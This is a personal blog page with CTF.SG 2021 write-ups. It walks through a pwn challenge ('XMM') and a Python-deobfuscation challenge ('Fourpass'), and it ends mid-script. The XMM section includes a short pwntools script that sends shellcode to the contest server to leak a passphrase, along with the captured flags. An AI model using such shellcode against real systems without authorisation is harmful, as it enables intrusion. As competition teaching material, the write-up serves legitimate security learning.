<!DOCTYPE html>
<html lang="en-US" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>CTFSG 2021 | N00bcak's Purple Cave</title>
    <meta name="description" content="Blogging Things When I Feel Like It">
    <meta name="generator" content="VitePress v2.0.0-alpha.15">
    <link rel="preload stylesheet" href="/assets/style._2iSb6vt.css" as="style">
    <link rel="preload stylesheet" href="/vp-icons.css" as="style">
    
    <script type="module" src="/assets/app.CqvJCtO3.js"></script>
    <link rel="preload" href="/assets/inter-roman-latin.Di8DUHzh.woff2" as="font" type="font/woff2" crossorigin="">
    <link rel="modulepreload" href="/assets/chunks/theme.BY6AaA-W.js">
    <link rel="modulepreload" href="/assets/chunks/framework.BXejxr2x.js">
    <link rel="modulepreload" href="/assets/writeups_2021-03-14-CTF-SG.md.DORRXnIJ.lean.js">
    <script id="check-dark-mode">(()=>{const e=localStorage.getItem("vitepress-theme-appearance")||"auto",a=window.matchMedia("(prefers-color-scheme: dark)").matches;(!e||e==="auto"?a:e==="dark")&&document.documentElement.classList.add("dark")})();</script>
    <script id="check-mac-os">document.documentElement.classList.toggle("mac",/Mac|iPhone|iPod|iPad/i.test(navigator.platform));</script>
  </head>
  <body>
    <div id="app"><div class="Layout" data-v-1df9f90f><!--[--><!--]--><!--[--><span tabindex="-1" data-v-331ec75c></span><a href="#VPContent" class="VPSkipLink visually-hidden" data-v-331ec75c>Skip to content</a><!--]--><!----><header class="VPNav" data-v-1df9f90f data-v-da52a441><div class="VPNavBar" data-v-da52a441 data-v-70946a35><div class="wrapper" data-v-70946a35><div class="container" data-v-70946a35><div class="title" data-v-70946a35><div class="VPNavBarTitle" data-v-70946a35 data-v-1e38c6bc><a class="title" href="/" data-v-1e38c6bc><!--[--><!--]--><!----><span data-v-1e38c6bc>N00bcak&#39;s Purple Cave</span><!--[--><!--]--></a></div></div><div class="content" data-v-70946a35><div class="content-body" data-v-70946a35><!--[--><!--]--><div class="VPNavBarSearch search" data-v-70946a35><!----></div><nav aria-labelledby="main-nav-aria-label" class="VPNavBarMenu menu" data-v-70946a35 data-v-39714824><span id="main-nav-aria-label" class="visually-hidden" data-v-39714824> Main Navigation </span><!--[--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/" tabindex="0" data-v-39714824 data-v-52a1d768><!--[--><span data-v-52a1d768>Home</span><!--]--></a><!--]--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/about-me.html" tabindex="0" data-v-39714824 data-v-52a1d768><!--[--><span data-v-52a1d768>About</span><!--]--></a><!--]--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/writeups.html" tabindex="0" data-v-39714824 data-v-52a1d768><!--[--><span data-v-52a1d768>CTF Writeups</span><!--]--></a><!--]--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/blog.html" tabindex="0" data-v-39714824 data-v-52a1d768><!--[--><span data-v-52a1d768>Blog</span><!--]--></a><!--]--><!--]--></nav><!----><div class="VPNavBarAppearance appearance" data-v-70946a35 data-v-6c893767><button class="VPSwitch VPSwitchAppearance" type="button" role="switch" title aria-checked="false" data-v-6c893767 data-v-5337faa4 data-v-1d5665e3><span class="check" data-v-1d5665e3><span class="icon" data-v-1d5665e3><!--[--><span class="vpi-sun sun" data-v-5337faa4></span><span class="vpi-moon moon" data-v-5337faa4></span><!--]--></span></span></button></div><div class="VPSocialLinks VPNavBarSocialLinks social-links" data-v-70946a35 data-v-0394ad82 data-v-d07f11e6><!--[--><a class="VPSocialLink no-icon" href="https://github.com/N00bcak" aria-label="github" target="_blank" rel="me noopener" data-v-d07f11e6 data-v-591a6b30><span class="vpi-social-github"></span></a><!--]--></div><div class="VPFlyout VPNavBarExtra extra" data-v-70946a35 data-v-bf2fac68 data-v-42cb505d><button type="button" class="button" aria-haspopup="true" aria-expanded="false" aria-label="extra navigation" data-v-42cb505d><span class="vpi-more-horizontal icon" data-v-42cb505d></span></button><div class="menu" data-v-42cb505d><div class="VPMenu" data-v-42cb505d data-v-25a6cce8><!----><!--[--><!--[--><!----><div class="group" data-v-bf2fac68><div class="item appearance" data-v-bf2fac68><p class="label" data-v-bf2fac68>Appearance</p><div class="appearance-action" data-v-bf2fac68><button class="VPSwitch VPSwitchAppearance" type="button" role="switch" title aria-checked="false" data-v-bf2fac68 data-v-5337faa4 data-v-1d5665e3><span class="check" data-v-1d5665e3><span class="icon" data-v-1d5665e3><!--[--><span class="vpi-sun sun" data-v-5337faa4></span><span class="vpi-moon moon" data-v-5337faa4></span><!--]--></span></span></button></div></div></div><div class="group" data-v-bf2fac68><div class="item social-links" data-v-bf2fac68><div class="VPSocialLinks social-links-list" data-v-bf2fac68 data-v-d07f11e6><!--[--><a class="VPSocialLink no-icon" href="https://github.com/N00bcak" aria-label="github" target="_blank" rel="me noopener" data-v-d07f11e6 data-v-591a6b30><span class="vpi-social-github"></span></a><!--]--></div></div></div><!--]--><!--]--></div></div></div><!--[--><!--]--><button type="button" class="VPNavBarHamburger hamburger" aria-label="mobile navigation" aria-expanded="false" aria-controls="VPNavScreen" data-v-70946a35 data-v-e5dd9c1c><span class="container" data-v-e5dd9c1c><span class="top" data-v-e5dd9c1c></span><span class="middle" data-v-e5dd9c1c></span><span class="bottom" data-v-e5dd9c1c></span></span></button></div></div></div></div><div class="divider" data-v-70946a35><div class="divider-line" data-v-70946a35></div></div></div><!----></header><div class="VPLocalNav empty fixed" data-v-1df9f90f data-v-db738f89><div class="container" data-v-db738f89><!----><div class="VPLocalNavOutlineDropdown" style="--vp-vh:0px;" data-v-db738f89 data-v-0bf0e06f><button data-v-0bf0e06f>Return to top</button><!----></div></div></div><!----><div class="VPContent" id="VPContent" data-v-1df9f90f data-v-c87f25bf><div class="VPDoc has-aside" data-v-c87f25bf data-v-7011f0d8><!--[--><!--]--><div class="container" data-v-7011f0d8><div class="aside" data-v-7011f0d8><div class="aside-curtain" data-v-7011f0d8></div><div class="aside-container" data-v-7011f0d8><div class="aside-content" data-v-7011f0d8><div class="VPDocAside" data-v-7011f0d8 data-v-3f215769><!--[--><!--]--><!--[--><!--]--><nav aria-labelledby="doc-outline-aria-label" class="VPDocAsideOutline" data-v-3f215769 data-v-60d5052e><div class="content" data-v-60d5052e><div class="outline-marker" data-v-60d5052e></div><div aria-level="2" class="outline-title" id="doc-outline-aria-label" role="heading" data-v-60d5052e>On this page</div><ul class="VPDocOutlineItem root" data-v-60d5052e data-v-1ce71065><!--[--><!--]--></ul></div></nav><!--[--><!--]--><div class="spacer" data-v-3f215769></div><!--[--><!--]--><!----><!--[--><!--]--><!--[--><!--]--></div></div></div></div><div class="content" data-v-7011f0d8><div class="content-container" data-v-7011f0d8><!--[--><!--]--><main class="main" data-v-7011f0d8><div style="position:relative;" class="vp-doc _writeups_2021-03-14-CTF-SG" data-v-7011f0d8><div><p>1 week, 1 CTF, 3 weeks straight. These CTFs just keep coming, don&#39;t they?</p><p>Interestingly the three CTFs were also arranged in order of increasing perceived difficulty, which was nice but also terrible at the same time because I had some trouble pulling my weight in this particular CTF in terms of points.</p><p>The CTF.SG CTF is the first open CTF event hosted by the CTF.SG team in Singapore, and was DEFINITELY not catered towards JC students. üòõ</p><p>Nevertheless, (not) my (usual) team managed to achieve a respectable 2nd place in this CTF!</p><p><img src="/assets/Images/CTF-SG/scoreboard.png" alt=""></p><h1 id="writeups" tabindex="-1">Writeups <a class="header-anchor" href="#writeups" aria-label="Permalink to ‚ÄúWriteups‚Äù">‚Äã</a></h1><p>Below are some of my writeups for this CTF:</p><ol><li><a href="#xmm">(Pwn) XMM</a></li><li><a href="#fourpass">(Misc) Fourpass</a></li></ol><h2 id="xmm" tabindex="-1">XMM <a class="header-anchor" href="#xmm" aria-label="Permalink to ‚ÄúXMM‚Äù">‚Äã</a></h2><p><code>Help Kenneth get the xmm!</code></p><h3 id="disclaimer" tabindex="-1">Disclaimer <a class="header-anchor" href="#disclaimer" aria-label="Permalink to ‚ÄúDisclaimer‚Äù">‚Äã</a></h3><p>This challenge was done after the CTF because <a href="https://ariana1729.github.io/" target="_blank" rel="noreferrer">ariana</a> too fast.</p><h3 id="reconnaissance" tabindex="-1">Reconnaissance <a class="header-anchor" href="#reconnaissance" aria-label="Permalink to ‚ÄúReconnaissance‚Äù">‚Äã</a></h3><p>We are greeted by a binary with the following checksecs:</p><p><img src="/assets/Images/CTF-SG/pwn-xmm/checksec.png" alt=""></p><p>,does the following:</p><p><img src="/assets/Images/CTF-SG/pwn-xmm/xmm_main.png" alt=""></p><p>and has two interesting functions:</p><p><img src="/assets/Images/CTF-SG/pwn-xmm/xmm_answer.png" alt=""></p><p><em>This one checks for some kind of constant passphrase, which is stored here:</em></p><p><img src="/assets/Images/CTF-SG/pwn-xmm/xmm_favorite.png" alt=""></p><p>So the challenge seems pretty straightforward which was probably why it was blitzed.</p><h3 id="vulnerability-analysis" tabindex="-1">Vulnerability analysis <a class="header-anchor" href="#vulnerability-analysis" aria-label="Permalink to ‚ÄúVulnerability analysis‚Äù">‚Äã</a></h3><ul><li>Passphrase is evidently not randomised. <ul><li>Opens up the possibility of a leak.</li></ul></li><li><code>mmap64()</code> basically gives us a huge area with which to write <strong>arbitrary</strong> shellcode. <ul><li>We can leak passphrase with some (hopefully not painful) shellcoding.</li></ul></li><li><code>answer()</code> prints flag. <ul><li>So we&#39;re going there.</li></ul></li></ul><h3 id="script" tabindex="-1">Script <a class="header-anchor" href="#script" aria-label="Permalink to ‚ÄúScript‚Äù">‚Äã</a></h3><p>There is honestly not much else to say. This challenge is pretty straightforward and I can probably only fault myself for not having opened it at all.</p><div class="language-python line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki shiki-themes github-light dracula" style="--shiki-light:#24292e;--shiki-dark:#F8F8F2;--shiki-light-bg:#fff;--shiki-dark-bg:#282A36;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> pwn </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;"> *</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">context.log_level</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">DEBUG</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> remote(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">chals.ctf.sg</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">, </span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">20401</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.recvuntil(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">‚îÉ ‚îÉ             </span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.sendline(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">newfonewhodis</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.sendline(asm(shellcraft.write(</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">,</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">49501d</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">13</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)))</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">string</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.recvall()[:</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">13</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">]</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> remote(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">chals.ctf.sg</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">, </span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">20401</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.recvuntil(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">‚îÉ ‚îÉ             </span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.sendline(string)</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>And thus we receive the flag:</p><p><code>CTFSG{xmm_hunter_1337}</code></p><p>... What a creepy challenge.</p><h2 id="fourpass" tabindex="-1">Fourpass <a class="header-anchor" href="#fourpass" aria-label="Permalink to ‚ÄúFourpass‚Äù">‚Äã</a></h2><p><code>This is my response to a certain telco‚Äôs OnePass. I call it ‚ÄúFourpass‚Äù (because it takes *four* inputs instead of *one*). I don‚Äôt think it‚Äôll get accepted because it is so slow though...</code></p><h3 id="reconnaissance-1" tabindex="-1">Reconnaissance <a class="header-anchor" href="#reconnaissance-1" aria-label="Permalink to ‚ÄúReconnaissance‚Äù">‚Äã</a></h3><p>We are given what appears to be a <code>token</code>, which I surmised to be some kind of binary. Until...</p><p><img src="/assets/Images/CTF-SG/misc-token/tokenfile.png" alt=""></p><p>... That was pretty dumb.</p><p>Now that we&#39;ve ascertained that the file is just Python code, we will simply beautify and rewrite said code:</p><div class="language-python line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki shiki-themes github-light dracula" style="--shiki-light:#24292e;--shiki-dark:#F8F8F2;--shiki-light-bg:#fff;--shiki-dark-bg:#282A36;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;">#!/usr/bin/python3.8</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">a, b, c, d </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-light-font-style:inherit;--shiki-dark:#8BE9FD;--shiki-dark-font-style:italic;"> list</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">map</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#005CC5;--shiki-light-font-style:inherit;--shiki-dark:#8BE9FD;--shiki-dark-font-style:italic;">int</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">, </span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">input</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">().split()))</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">gcd</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=lambda</span><span style="--shiki-light:#24292E;--shiki-light-font-style:inherit;--shiki-dark:#FFB86C;--shiki-dark-font-style:italic;"> f</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">: </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">lambda</span><span style="--shiki-light:#24292E;--shiki-light-font-style:inherit;--shiki-dark:#FFB86C;--shiki-dark-font-style:italic;"> x</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">,</span><span style="--shiki-light:#24292E;--shiki-light-font-style:inherit;--shiki-dark:#FFB86C;--shiki-dark-font-style:italic;">y</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">: x </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">if</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;"> not</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> y </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">else</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> f(y,x</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">%</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">y)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">    sum</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">( </span><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># Sums them up???</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">        filter</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">            lambda</span><span style="--shiki-light:#24292E;--shiki-light-font-style:inherit;--shiki-dark:#FFB86C;--shiki-dark-font-style:italic;"> x</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">: x</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">==</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">, </span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;">            # Finds all values within here that are 1.</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">            map</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">( </span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;">                # x below is val_1 and val_2 as a tuple.</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">                lambda</span><span style="--shiki-light:#24292E;--shiki-light-font-style:inherit;--shiki-dark:#FFB86C;--shiki-dark-font-style:italic;"> x</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">:(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">lambda</span><span style="--shiki-light:#24292E;--shiki-light-font-style:inherit;--shiki-dark:#FFB86C;--shiki-dark-font-style:italic;"> f</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">:(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">lambda</span><span style="--shiki-light:#24292E;--shiki-light-font-style:inherit;--shiki-dark:#FFB86C;--shiki-dark-font-style:italic;"> z</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">:z(z))(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">lambda</span><span style="--shiki-light:#24292E;--shiki-light-font-style:inherit;--shiki-dark:#FFB86C;--shiki-dark-font-style:italic;"> z</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">:f(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">lambda</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;"> *</span><span style="--shiki-light:#24292E;--shiki-light-font-style:inherit;--shiki-dark:#FFB86C;--shiki-dark-font-style:italic;">y</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">: z(z)(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">y)))) </span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;">                # z(z) is recursion.</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">                    (gcd)(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">x), </span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;">                    # Again, val_1,val_2 (something)(gcd(f,x))</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">                    [(val_1, val_2) </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">for</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> val_1 </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">in</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;"> range</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(a, b) </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">for</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> val_2 </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">in</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;"> range</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(c, d)] </span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;">                    # All possible tuples of f and x.</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">            )</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">        )</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">        )</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># Verdict: We count the number of coprime tuples in a&lt;=val_1&lt;b,c&lt;=val_2&lt;d</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><p>And thus we make the following deductions:</p><ul><li><code>gcd</code> is well... gcd. (Extracted from that ugly thing in the middle.)</li><li>Iterating through some set of tuples, we are retrieving the gcd... and?</li><li><code>lambda z: z(z)</code> must be recursion. Unexpected <a href="https://allthingslinguistic.com/post/95678520747/the-lambda-calculus-for-absolute-dummies-like" target="_blank" rel="noreferrer">linguistics</a>.</li><li>As I have already annotated above, the program counts the number of coprime tuples in <code>a&lt;=val_1&lt;b,c&lt;=val_2&lt;d</code>. <ul><li>This is not difficult to see as we can rewrite the whole function inside the <code>map()</code> as:</li></ul><div class="language-python line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki shiki-themes github-light dracula" style="--shiki-light:#24292e;--shiki-dark:#F8F8F2;--shiki-light-bg:#fff;--shiki-dark-bg:#282A36;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">sum</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">filter</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">lambda</span><span style="--shiki-light:#24292E;--shiki-light-font-style:inherit;--shiki-dark:#FFB86C;--shiki-dark-font-style:italic;"> x</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">: x</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">==</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">map</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(gcd,[(val_1, val_2) </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">for</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> val_1 </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">in</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;"> range</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(a, b) </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">for</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> val_2 </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">in</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;"> range</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(c, d)]))))</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div></li></ul><p>However, this is not the main challenge, sadly for me.</p><h3 id="the-real-challenge-nc-chals-ctf-sg-15201" tabindex="-1">The Real Challenge: nc chals.ctf.sg 15201 <a class="header-anchor" href="#the-real-challenge-nc-chals-ctf-sg-15201" aria-label="Permalink to ‚ÄúThe Real Challenge: nc chals.ctf.sg 15201‚Äù">‚Äã</a></h3><p>Where I <strong>REALLY</strong> got stuck was this part, where you receive <code>enormous numbers</code> and this happens:</p><p>The existing program was too inefficient to actually do its job in this particular context.</p><p>Naturally, seeing a pattern, I was inclined to think of it as a problem involving <code>Euler&#39;s Totient Function</code>. But <a href="https://ariana1729.github.io/" target="_blank" rel="noreferrer">ariana</a> finished up with his challenge and shifted his attention to this particular challenge. That was very good for me since I can&#39;t function at night.</p><p>See his writeup <a href="https://ariana1729.github.io/writeups/CTFSG/FourPass/2021-03-14-FourPass.html" target="_blank" rel="noreferrer">here</a>.</p><p>... And then I woke up to the flag!</p><p>Flag: <code>CTFSG{c_4_c0pR1me_Int3geRs}</code></p></div></div></main><footer class="VPDocFooter" data-v-7011f0d8 data-v-e257564d><!--[--><!--]--><!----><!----></footer><!--[--><!--]--></div></div></div><!--[--><!--]--></div></div><!----><!--[--><!--]--></div></div>
    <script>window.__VP_HASH_MAP__=JSON.parse("{\"about-me_index.md\":\"DcA_vmxN\",\"api-examples.md\":\"CkOuBZZS\",\"blog_index.md\":\"rPbq4i6E\",\"index.md\":\"BEw_psNO\",\"markdown-examples.md\":\"5C1dOAk0\",\"writeups_2021-03-02-dso-nus-ctf.md\":\"CWlHsggK\",\"writeups_2021-03-07-whitehacks.md\":\"C2A_3m7F\",\"writeups_2021-03-14-ctf-sg.md\":\"DORRXnIJ\",\"writeups_2021-03-27-umass-ctf.md\":\"BDpIrp0o\",\"writeups_2021-04-08-angstromctf-2021.md\":\"s2JreVXy\",\"writeups_2021-06-20-hsctf-8.md\":\"BzCZvhFM\",\"writeups_2021-06-26-cddc-2021.md\":\"DbOndx-U\",\"writeups_2021-09-05-cyberthon.md\":\"eXTsBky1\",\"writeups_2025-10-13-govtech-ai-ctf-2025-quals.md\":\"DTkDLnW8\",\"writeups_index.md\":\"DR_Jo5zI\"}");window.__VP_SITE_DATA__=JSON.parse("{\"lang\":\"en-US\",\"dir\":\"ltr\",\"title\":\"N00bcak's Purple Cave\",\"description\":\"Blogging Things When I Feel Like It\",\"base\":\"/\",\"head\":[],\"router\":{\"prefetchLinks\":true},\"appearance\":true,\"themeConfig\":{\"nav\":[{\"text\":\"Home\",\"link\":\"/\"},{\"text\":\"About\",\"link\":\"/about-me\"},{\"text\":\"CTF 